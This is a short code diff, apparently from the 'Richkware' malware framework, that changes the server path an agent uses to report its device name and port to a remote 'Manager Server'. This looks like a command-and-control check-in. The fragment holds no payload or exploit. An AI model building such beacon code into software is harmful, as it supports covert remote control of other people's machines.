@@ -138,7 +138,7 @@ bool Network::UploadInfoToRichkwareManagerServer(const char * serverAddress, con
 	std::string deviceStr = "$" + device.getName() + "," + device.getServerPort() + "$";
 	//deviceStr = EncryptDecrypt(deviceStr,"5");
 
-	RawRequest(serverAddress, port, ("GET /Richkware-Manager-Server/AddDeviceServlet?data=" +deviceStr +" \r\nHost: " + serverAddress + "\r\nConnection: close\r\n\r\n").c_str());
+	RawRequest(serverAddress, port, ("GET /Richkware-Manager-Server/AddInfo?data=" +deviceStr +" \r\nHost: " + serverAddress + "\r\nConnection: close\r\n\r\n").c_str());
 	
 	return true;
 }
